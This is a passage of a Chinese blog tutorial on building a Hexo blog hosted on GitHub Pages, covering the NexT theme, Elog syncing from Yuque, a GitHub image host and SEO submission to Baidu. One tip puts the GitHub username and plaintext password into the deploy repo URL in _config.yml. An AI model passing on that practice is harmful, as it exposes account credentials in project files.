85);">设置你的账号信息:</font></p><table><thead><tr><th><code>plain git config --global user.name &quot;yourname&quot; </code></th></tr></thead></table><p><font style="color:rgb(85, 85, 85);">github邮箱</font></p><table><thead><tr><th><code>plain git config --global user.email &quot;xxx@xxx.com&quot; </code></th></tr></thead></table><h3 id="本地搭建-Hexo"><a href="#本地搭建-Hexo" class="headerlink" title="本地搭建 Hexo"></a>本地搭建 Hexo</h3><p><a href="https://nodejs.org/en/">下载Hexo</a></p><p>一路下一步</p><p>切换阿里云镜像源<code>npm config set registry https://registry.npmmirror.com</code></p><p>安装 cnpm<code>npm install -g cnpm --registry=[https://registry.npmmirror.com](https://registry.npmmirror.com)</code></p><p>用 cnpm 安装 hexo<code>cnpm install -g hexo-cli</code></p><p>检查是否安装成功<code>hexo -v</code></p><h3 id="本地创建-Hexo-博客文件"><a href="#本地创建-Hexo-博客文件" class="headerlink" title="本地创建 Hexo 博客文件"></a>本地创建 Hexo 博客文件</h3><p>下载 nodejs</p><p><a href="https://nodejs.org/zh-cn/">nodejs官网，直接下载，一路回车即可</a></p><p>需要把 nodejs 加入系统环境变量<code>npm.cmd 和 node.exe</code>（就在文件夹的主目录）</p><p>选择一个文件夹，进入后<code>hexo init</code>，会生成如下文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">node_modules: 依赖包</span><br><span class="line">public：存放生成的页面</span><br><span class="line">scaffolds：生成文章的一些模板</span><br><span class="line">source：用来存放你的文章</span><br><span class="line">themes：放下下载的主题</span><br><span class="line">_config.yml: 博客的核心配置文件（设置主体、标题等属性）</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/8225ff2cc50b7206035d56222ecf6a44.png"></p><p>启动<code>cnpm install</code></p><p>启动 hexo<code>hexo s -g</code></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/6aa745739bc351d328f46cf2883c305e.png"></p><p>直接访问<code>127.0.0.1:4000</code></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/8c34120669b6879aabd5b5c9935aac1b.png"></p><h3 id="Hexo-托管至-github"><a href="#Hexo-托管至-github" class="headerlink" title="Hexo 托管至 github"></a>Hexo 托管至 github</h3><p>打开文件</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/b22fc597cc374590a816d49f0dddb909.png"></p><p>文件最下面</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/124a97223e50fe05b37d6929b5f7c7f1.png"></p><p>安装部署命令<code>cnpm install hexo-deployer-git --save</code></p><p>本地hexo&#x2F;source中创建一个名为CNAME文件，不要前缀。写上你的域名<code>godice.top</code></p><p><strong><font style="color:#DF2A3F;">编译本地文件提交到 github</font></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure><p>如果之前在github添加好了ssh，部署时是不会要求输入密码的，如果不想添加ssh，也可以把_config.yml文件中的repo设置成如下格式，也可以免密部署</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">repo: https://github用户名:密码@github.com/github用户名/github用户名.github.io.git</span><br></pre></td></tr></table></figure><h3 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h3><p>注意：在配置文件中的分支，需要和 github 项目中的默认分支一致</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/b7b299d1831140b01d6ffd9e55546c46.png"></p><p>如图</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/20fe54e91f8f166033c26841e84db96f.png"></p><p>修改如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:godicee/godicee.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><p>重新编译上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure><h3 id="hexo-文件解析"><a href="#hexo-文件解析" class="headerlink" title="hexo 文件解析"></a>hexo 文件解析</h3><p>编译后会生成如下两个文件</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/28dc76a5887ac7c7e2612ea04e6d9d31.png"></p><p>静态页面文件就放在 public 下</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/1130d6756b531b8c81176a3ce672fde1.png"></p><h3 id="设置域名-dns-解析"><a href="#设置域名-dns-解析" class="headerlink" title="设置域名 dns 解析"></a>设置域名 dns 解析</h3><p>（域名记得备案，top 结尾的不需要备案）</p><p>进入购买域名的网站，进入域名解析设置。我这里是 aliyun——云解析 DNS</p><p>还需要设置 github 解析到域名</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/d2f1bd555972164f6685cd7b6a323185.png"></p><h3 id="next-主题"><a href="#next-主题" class="headerlink" title="next 主题"></a>next 主题</h3><p><a href="https://blog.csdn.net/m0_53747349/article/details/131490114">next主题添加访客人数</a></p><p><a href="https://blog.csdn.net/wangqingchuan92/article/details/126346205">next主题添加网站运行时间</a></p><p>安装 swip<code>npm i hexo-renderer-swig</code></p><p><strong>hexo 中有两种名为_config.yml 的配置文件</strong></p><p><strong>网站配置文件在主路径下主题配置文件：在某个主题的内部</strong></p><p><a href="https://blog.csdn.net/as480133937/article/details/100138838">next主题个性化配置</a></p><h4 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h4><p>修改网站配置文件中<code>theme: next</code></p><p>修改后：<code>hexo clean</code>然后<code>hexo g -d</code></p><h4 id="设置文章置顶"><a href="#设置文章置顶" class="headerlink" title="设置文章置顶"></a>设置文章置顶</h4><p><img src="https://raw.githubusercontent.com/godicee/img/main/3fa681044d29727fc0d7a2254e93ca8d.png"></p><h3 id="添加-Waline-评论系统-带后端"><a href="#添加-Waline-评论系统-带后端" class="headerlink" title="添加 Waline 评论系统(带后端)"></a>添加 Waline 评论系统(带后端)</h3><p><a href="https://blog.csdn.net/jiunian_2761/article/details/122621667">参考文档</a></p><p><a href="https://console.leancloud.app/register">leancloud数据库账号注册</a></p><p>这里无论无何都无法显示，发现是自己的 next 版本太低了，waline 只支持 next8.xxx 版本</p><h3 id="next-升级"><a href="#next-升级" class="headerlink" title="next 升级"></a>next 升级</h3><p><a href="https://github.com/next-theme/hexo-theme-next">直接去github官网即可</a></p><h2 id="next8-个性化配置"><a href="#next8-个性化配置" class="headerlink" title="next8 个性化配置"></a>next8 个性化配置</h2><p><a href="https://console.leancloud.app/">leancloud网站：数据库管理</a></p><p><a href="https://vercel.com/">vercel网站：评论区管理</a></p><p>个人觉得默认的主题 1 最好看（234 主题都差不多）</p><p><a href="https://blog.csdn.net/a171232886/article/details/121210072">分享功能</a></p><p><a href="https://blog.nachtgeistw.zone/hexo-blog-config-2/">next个性化设置（有些老版本，不一定适配）</a></p><p><a href="https://blog.nachtgeistw.zone/hexo-blog-config-2/">博客参考搭建链接（参考这个博客的样式）</a></p><p><a href="https://juejin.cn/post/7169115268944560135#heading-6">next8个性化配置（新版本）</a></p><p><a href="https://cs-cshi.github.io/hexo-blog/Hexo-NexT%20%E8%AE%BE%E7%BD%AE%E8%BF%91%E6%9C%9F%E6%96%87%E7%AB%A0/">添加近期文章</a></p><h3 id="导航栏配置"><a href="#导航栏配置" class="headerlink" title="导航栏配置"></a>导航栏配置</h3><h4 id="导航栏架构"><a href="#导航栏架构" class="headerlink" title="导航栏架构"></a>导航栏架构</h4><p>导航栏：位于左侧，做文档分类的作用</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/a515dd74ee0bbf9e602b332875de008a.png"></p><ul><li>三级菜单：用日常为例<ul><li>第一级：日常</li><li>第二级：读书、艺术、脑洞、待办事项</li><li>第二级：书单、读书笔记</li></ul></li><li><strong><font style="color:#DF2A3F;">注意：</font></strong><ul><li>每个菜单的子页面必须有一个 default 页（在单击菜单时会显示）</li><li>顶级页面必须携程&#x2F;xxx.html，不然顶上菜单会消失</li></ul></li></ul><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: / || fa fa-home</span><br><span class="line">  #（中略）</span><br><span class="line">  日常:</span><br><span class="line">    default: /essay/ || fa fa-icons</span><br><span class="line">    读书: </span><br><span class="line">      default: /books/ || fa fa-book</span><br><span class="line">      书单: /list.html || fa fa-lines-leaning</span><br><span class="line">      读书笔记: /notes.html || fa fa-feather-pointed</span><br><span class="line">    艺术: /arts.html || fa fa-icons</span><br><span class="line">    脑洞: /xmind.html || fa fa-lightbulb</span><br><span class="line">    待办事项: /todo.html || fa fa-list-check</span><br><span class="line">  about: /about/ || fa fa-user</span><br><span class="line">  #（后略）</span><br></pre></td></tr></table></figure><p>在<code>/hexo/source/</code>下手动创建页面：（文件名&amp;文件结构必须和<code>menu</code>中 <code>|| </code>前的目录一致）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">hexo\source</span><br><span class="line">└─essay</span><br><span class="line">  │  index.md</span><br><span class="line">  │  arts.md</span><br><span class="line">  │  xmind.md</span><br><span class="line">  │  todo.md</span><br><span class="line">  │</span><br><span class="line">  └─books</span><br><span class="line">        index.md</span><br><span class="line">        list.md</span><br><span class="line">        notes.md</span><br></pre></td></tr></table></figure><h3 id="访问人数-站点运行时间踩坑"><a href="#访问人数-站点运行时间踩坑" class="headerlink" title="访问人数&amp;站点运行时间踩坑"></a>访问人数&amp;站点运行时间踩坑</h3><p>注意，这里因为我改了不少次，踩到一个坑</p><p>在&#x2F;blog&#x2F;themes&#x2F;next&#x2F;layout&#x2F;_partials&#x2F;footer.njk 文件中添加代码设置访问人数和站点运行时间时：</p><p><strong><font style="color:#DF2A3F;">特别注意：运行时间的代码必须放在最下面，不然访问人数显示不出来</font></strong></p><p>访问人数代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if theme.footer.counter %&#125;</span><br><span class="line">    &lt;script async src=&quot;//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>运行时间代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- </span><br><span class="line"> --&gt;</span><br><span class="line">&lt;!-- 网站运行时间的设置 --&gt;</span><br><span class="line">&lt;span id=&quot;timeDate&quot;&gt;载入天数...&lt;/span&gt;</span><br><span class="line">&lt;!-- &lt;span id=&quot;times&quot;&gt;载入时分秒...&lt;/span&gt; --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var now = new Date();</span><br><span class="line">    function createtime() &#123;</span><br><span class="line">        var grt= new Date(&quot;12/10/2024 00:00:00&quot;);//此处修改你的建站时间或者网站上线时间</span><br><span class="line">        now.setTime(now.getTime()+250);</span><br><span class="line">        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);</span><br><span class="line">        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);</span><br><span class="line">        if(String(hnum).length ==1 )&#123;hnum = &quot;0&quot; + hnum;&#125; minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);</span><br><span class="line">        mnum = Math.floor(minutes); if(String(mnum).length ==1 )&#123;mnum = &quot;0&quot; + mnum;&#125;</span><br><span class="line">        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);</span><br><span class="line">        snum = Math.round(seconds); </span><br><span class="line">        if(String(snum).length ==1 )&#123;snum = &quot;0&quot; + snum;&#125;</span><br><span class="line">        // var times = document.getElementById(&quot;times&quot;).innerHTML = hnum + &quot; 小时 &quot; + mnum + &quot; 分 &quot; + snum + &quot; 秒&quot;;</span><br><span class="line">        document.getElementById(&quot;timeDate&quot;).innerHTML = &quot;本站已安全运行 &quot;+dnum+&quot; 天 &quot;+hnum + &quot; 小时 &quot; + mnum + &quot; 分 &quot; + snum + &quot; 秒&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">setInterval(&quot;createtime()&quot;,250);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="PicGo-Github搭建图床"><a href="#PicGo-Github搭建图床" class="headerlink" title="PicGo+Github搭建图床"></a>PicGo+Github搭建图床</h3><p><a href="https://blog.csdn.net/qq_30163677/article/details/135194103">图床搭建参考1</a></p><p><a href="https://www.haoyep.com/posts/github-graph-beds/">图床搭建参考2</a></p><p><a href="https://github.com/Molunerfinn/PicGo/releases">PicGo下载链接</a></p><p>使用 GitHub 作为图床的优势在于免费、稳定且具有版本控制功能，特别适合个人博客、小型项目等。PicGo作为一个开源的图床上传工具，提供了丰富的功能，使得管理图床变得更加便捷。</p><p>然而，对于有大量图片请求或对加载速度要求很高的项目，以及对存储空间需求较大的项目，可能需要考虑使用专门的图片存储服务。这些服务通常会提供更快的访问速度和更大的存储空间，但可能会涉及一些费用。</p><p>在选择图床方案时，需要根据具体需求权衡利弊，选择最适合项目的方案。</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/09a02eda3621aa287341ce49136de5ab.png"></p><p>成功上传</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/4984635bc9de5bb0bb393c00f7cc6a3d.png"></p><h2 id="Elog-解决写作同步"><a href="#Elog-解决写作同步" class="headerlink" title="Elog 解决写作同步"></a>Elog 解决写作同步</h2><p><a href="https://github.com/LetTTGACO/elog">Elog的github官网</a></p><p>在遇到Elog之前，你的博客可能是：</p><ul><li>本地编辑器书写 + Hexo&#x2F;Hugo&#x2F;Vitepress部署</li><li>语雀记录</li><li>Notion记录和发布</li><li>WordPress在线书写和发布</li><li>GHost在线书写和发布</li><li>Github记录</li><li>掘金&#x2F;知乎等在线平台记录</li></ul><p>可以发现，大部分博客平台要么自己提供在线编辑器，要么就让用户本地书写再进行进行部署。 可惜目前好用的编辑器大都都不是博客平台自己提供的，而是一些第三方编辑器，代表产品：</p><ul><li>Notion：出色的数据库设计，灵活度非常高</li><li>FlowUs：仿Notion的国内文档产品，用了下还不错</li><li>飞书云文档：也是一个很出色的在线协同文档工具，主打工作&#x2F;团队场景，也有个人版</li><li>语雀：阿里出品，笔者觉得很不错的一款在线编辑器，涵盖日常个人、工作所需要的各种场景，够用</li><li>Typora：一款出色的本地编辑器，支持实时预览和流程书写，可惜新版本收费了</li></ul><p>而博客平台一般分为两类，一种是轻量化的，只负责渲染文档不提供编辑器，代表产品：</p><ul><li>Hexo</li><li>Vitepress</li><li>HuGo</li><li></li></ul><p>一种是内容管理系统软件，相对上面这些比较重，初期涉及到数据库和手动部署，拥有自己的编辑器，代表产品：</p><ul><li>WordPress</li><li>GHost</li></ul><p>和很多在线平台一样，Notion和语雀也同样存在图片防盗链的问题，直接将写作平台的图片链接放到其他站点的话，会加载不出来。 为了解决这个问题，Elog支持了在生成MD文件之前，将扫描到的图片上传到图床上，并对文档中的图片链接进行替换。 <strong><font style="color:#DF2A3F;">当前支持的图床有：</font></strong></p><ul><li>本地</li><li>腾讯云COS</li><li>阿里云OSS</li><li>Github图床</li><li>七牛云</li><li>又拍云</li></ul><h3 id="elog-相关配置"><a href="#elog-相关配置" class="headerlink" title="elog 相关配置"></a>elog 相关配置</h3><p><a href="https://elog.1874.cool/yuque-pwd/start">elog配置（语雀版）</a></p><p>首先安装 cli</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 使用 npm 安装 CLI</span><br><span class="line">npm install @elog/cli -g</span><br><span class="line"></span><br><span class="line"># 使用 yarn 安装 CLI</span><br><span class="line">yarn global add @elog/cli</span><br><span class="line"></span><br><span class="line"># 使用 pnpm 安装 CLI</span><br><span class="line">pnpm install @elog/cli -g</span><br></pre></td></tr></table></figure><p>成功会在目录下生成两个文件</p><ul><li><code>elog.config.js</code>配置文件和本地调试用</li><li><code>.elog.env</code>环境变量配置文件</li></ul><p><img src="https://raw.githubusercontent.com/godicee/img/main/cd4243a4b0a7865312611dcfe2778b1a.png"></p><p>接下来需要修改一些配置</p><p><a href="https://elog.1874.cool/yuque/fe8ywmt999gon12w">修改配置方法</a></p><p>本地调试：修改.elog.env 中的值<code>elog sync -e .elog.env</code></p><p>这里需要特别注意，需要的三种信息</p><ul><li>login：用户名（不是很长的地址，是最后的用户名）</li><li>repo：知识库（不是很长的地址，只是最后的知乎库名）</li><li>token：登录 token（需要高级会员）<ul><li>也可以用账户&amp;密码登录，但是可能存在 github 解析了大量美国 ip 到语雀<ul><li>可能引发安全问题</li></ul></li></ul></li></ul><p><img src="https://raw.githubusercontent.com/godicee/img/main/2380997949c4a5748372bba7bd160b76.png"></p><h3 id="GitHub-图床配置"><a href="#GitHub-图床配置" class="headerlink" title="GitHub 图床配置"></a>GitHub 图床配置</h3><p>需要在 elog.config.js 文件中修改 image 部分为 github，且写好正确的 branch</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/058620055bc6eb719a526f8eb8ea2bc1.png"></p><p>然后需要去.elog.env 中设置 github 的信息，上面文章给出了不再赘述</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/2b2dca023ecd998c589001a9da0cb2f4.png"></p><p>这里有时候上传图片会失败，因为是传到 github， 可以设置一个终端代理即可</p><h3 id="Elog-操作"><a href="#Elog-操作" class="headerlink" title="Elog 操作"></a>Elog 操作</h3><p>同步文章<code>elog sync -e .elog.env</code></p><p>清理文章、上次同步缓存、上次同步时间<code>elog clean</code></p><h3 id="elog-上传目录设置"><a href="#elog-上传目录设置" class="headerlink" title="elog 上传目录设置"></a>elog 上传目录设置</h3><p>elog.config.js 文件中修改 deploy</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">deploy: &#123;</span><br><span class="line">    platform: &#x27;local&#x27;,</span><br><span class="line">    local: &#123;</span><br><span class="line">      outputDir: &#x27;./source/_posts&#x27;,</span><br><span class="line">      filename: &#x27;title&#x27;,</span><br><span class="line">      format: &#x27;markdown&#x27;,</span><br><span class="line">      frontMatter: &#123;</span><br><span class="line">        enable: true,</span><br><span class="line">        include: [], // 只输出include包含的属性</span><br><span class="line">        exclude: [], // 不输出exclude包含的属性</span><br><span class="line">        default:&#123;</span><br><span class="line">          title: &#x27;test&#x27;,</span><br><span class="line">          categories: &#x27;安全基础&#x27;,</span><br><span class="line">          author: &#x27;godice&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h3 id="elog-默认路径设置"><a href="#elog-默认路径设置" class="headerlink" title="elog 默认路径设置"></a>elog 默认路径设置</h3><p>elog 默认生成的文件是在.&#x2F;docs 中，去 config 中改到你想要的位置</p><p>我这里改为了<code>./source/_posts</code>就会自动上传到博客主页中</p><h2 id="Next-目录组织和相关配置"><a href="#Next-目录组织和相关配置" class="headerlink" title="Next 目录组织和相关配置"></a>Next 目录组织和相关配置</h2><h3 id="目录设置"><a href="#目录设置" class="headerlink" title="目录设置"></a>目录设置</h3><ul><li>需求：<ul><li>1 在侧面导航栏的分类页面下设置多个种类</li><li>2 点击某个种类进去使用时间轴记录上传的文档</li></ul></li><li>操作：<ul><li>1 在主题 config 中取消<code>categories 的注释</code></li><li>2 在<code>hexo new page categories</code>（创建 hexo&#x2F;source&#x2F;categories 目录）</li><li>3 修改hexo&#x2F;source&#x2F;categories 下的 index.md 文件</li><li>4 在<code>hexo/source/_post/</code>中上传文件：修改其 yaml font matter 即可自动分类<ul><li>yaml font matter 可以理解为为 md 开头最顶上的一个注释内容</li><li>在标题 2.7 中我们已经默认设置上传路径为 post 了，所以只需要进去分类即可<ul><li>注意：这里不需要做额外设置，在 md 中添加的新分类，会自动添加到分类下的 index.md 中<ul><li>且会自动生成超链接</li></ul></li></ul></li></ul></li></ul></li></ul><p>1 取消注释</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/72179ab48f3e289f8c36e8092cf2ac62.png"></p><p>2 创建目录<code>hexo new page categories</code></p><p>3 修改 index.md 文件为如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: categories</span><br><span class="line">date: 2024-12-12 22:59:52</span><br><span class="line">type: categories</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>4 上传文件 test.md 到<code>hexo/source/_post/</code>中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 个性化设置Hexo博客的NexT主题</span><br><span class="line">tags:</span><br><span class="line">  - Hexo</span><br><span class="line">  - NexT</span><br><span class="line">categories:</span><br><span class="line">  - - Hexo搭建与使用</span><br><span class="line">abbrlink: 61230</span><br><span class="line">date: 2024-02-01 10:51:56</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">将这个文件放入hexo/source/_post/中，会自动完成以下事项：</span><br><span class="line">1在目录中自动生成&quot;Hexo搭建与使用&quot;这个分类</span><br><span class="line">2点击这个分类进去，会显示所有分类为&quot;Hexo搭建与使用&quot;分类的文章</span><br><span class="line">（且展示方式为时间轴方式）</span><br><span class="line">3本文章在分类&quot;Hexo搭建与使用&quot;中的名字会被命名为&quot;个性化设置Hexo博客的NexT主题&quot;</span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/400cdba0fab76881a51f5a4a0a4a7f1b.png"></p><p>点击进入 Hexo 搭建与使用分类</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/62d13fdb34c230bb9200a4e53642408c.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>因此，以后上传文件就只需要做两个操作<ul><li>1 用 elog 命令<code>elog sync -e .elog.env</code>会上传改动了的文件到<code>hexo/source/_post</code></li><li>2 去 <code>_post</code>自行修改文章分类</li></ul></li><li>达到的效果：<ul><li>1 文章会自动归档</li><li>2 会在分类下自动生成新的分类</li><li>3 点击每个分类进去都是用时间轴展示的</li></ul></li></ul><p>注意：我发现配置了站点目录以后，站点会自动生成目录，就不需要在语雀再手打了</p><p>（不然会生成双重目录）</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/ebe39afbdc3b65e00b87cf72ada136e4.png"></p><h2 id="杂项修改"><a href="#杂项修改" class="headerlink" title="杂项修改"></a>杂项修改</h2><h3 id="命令行全局代理"><a href="#命令行全局代理" class="headerlink" title="命令行全局代理"></a>命令行全局代理</h3><p>问题：在用 elog 上传文件时偶尔会出现，上传失败的问题，因为用的 github 作图床</p><p>需要给命令行配置一个全局代理</p><p>我这里提供一个最简单的方法：</p><p>1 在 clash 代理——全局模式</p><p>（注意，这里尽量选香港节点，不然访问语雀的 api 也会有问题）</p><p>2clash——主页——TUN 模式（开启）</p><h3 id="显示摘要"><a href="#显示摘要" class="headerlink" title="显示摘要"></a>显示摘要</h3><p>如果要只显示摘要，就在博文的md文件中想要隐藏的内容上方，添加<code>&lt;!–more–&gt;</code></p><h3 id="SEO-优化"><a href="#SEO-优化" class="headerlink" title="SEO 优化"></a>SEO 优化</h3><p>建议这三个参考文档的优化都做一下</p><p><a href="https://blog.csdn.net/unnamedm/article/details/137479121">SEO优化参考（初级）</a></p><p><a href="https://www.eula.club/blogs/%E6%90%AD%E5%BB%BAHexo%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E5%B9%B6%E4%BD%BF%E7%94%A8Git%E9%83%A8%E7%BD%B2%E5%88%B0VPS.html#_8-2-%E6%8F%90%E4%BA%A4%E7%AB%99%E7%82%B9%E5%9C%B0%E5%9B%BE">超详细SEO（建议看这个）</a></p><p><a href="https://www.duheweb.com/post/20210417143744.html">详细SEO（包含高级SEO优化）</a></p><p>**<font style="color:#DF2A3F;">特别注意：</font>**写文章题目的时候不要用符号<code>&amp;</code>会被识别为 html 实体编码，导致 sitemap 解析错误</p><p>（下面写了百度的登记，google、必应、搜狗也是类似的，不再赘述）</p><p>在<a href="https://www.duheweb.com/post/20210417143744.html">详细SEO（包含高级SEO优化）</a>这个参考文档中有，遇到问题可以查看</p><h4 id="百度验证踩坑"><a href="#百度验证踩坑" class="headerlink" title="百度验证踩坑"></a>百度验证踩坑</h4><ul><li>在向百度站长网站，登记自己的网站的时候，需要验证网站是自己的</li><li>有两种验证方式：都是上传一个文件到网站根目录下</li><li>由于 hexo 会自动编译其中的文件，所以会验证失败<ul><li>1：把百度给的文件放在 public 文件下</li><li>2：去网站配置文件中，设置跳过编译的文件名</li></ul></li></ul><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">skip<span class="emphasis">_render:</span></span><br><span class="line"><span class="emphasis">  - baidu_</span>verify<span class="emphasis">_codeva-xxxxx.html</span></span><br></pre></td></tr></table></figure><p>（我后续选择的 token 提交）</p><h4 id="百度通过-api-主动提交链接"><a href="#百度通过-api-主动提交链接" class="headerlink" title="百度通过 api 主动提交链接"></a>百度通过 api 主动提交链接</h4><p>（首先你需要提交网站，然后验证网站是自己的）</p><p>百度站长平台：</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/6b6d86af7a2347751bb2ab0469562ed6.png"></p><p>然后</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">安装插件</span><br><span class="line">npm install hexo-baidu-url-submit --save</span><br><span class="line">在站点配置文件种增加</span><br><span class="line">baidu<span class="emphasis">_url_</span>submit:</span><br><span class="line">  count: 1 ## 提交最新的一个链接</span><br><span class="line">  host: godice.top ## 在百度站长平台中注册的域名</span><br><span class="line">  token: your<span class="emphasis">_token ## 请注意这是您的秘钥，所以请不要把博客源代码发布在公众仓库里!</span></span><br><span class="line"><span class="emphasis">  path: baidu_</span>urls.txt ## 文本文档的地址， 新链接会保存在此文本文档里</span><br><span class="line"></span><br><span class="line">需要设置url值为包含是百度站长平台注册的域名</span><br><span class="line">url: https://godice.top</span><br><span class="line">permalink: :layout/:title.html</span><br><span class="line"></span><br><span class="line">加入新的deployer:</span><br><span class="line">deploy:</span><br><span class="line"><span class="bullet">-</span> type: git ## 这一条是原来有的，但在前面加了个 -, 不然会报错的</span><br><span class="line">  repo: git@github.com:duheweb/duheweb.github.io.git</span><br><span class="line">  branch: master</span><br><span class="line"><span class="bullet">-</span> type: baidu<span class="emphasis">_url_</span>submitter   ## 这一条是新加的  注意前面有个 -, 不然会报错的</span><br></pre></td></tr></table></figure><p>然后执行 hexo generate 的时候，就会自动推送</p><p><img 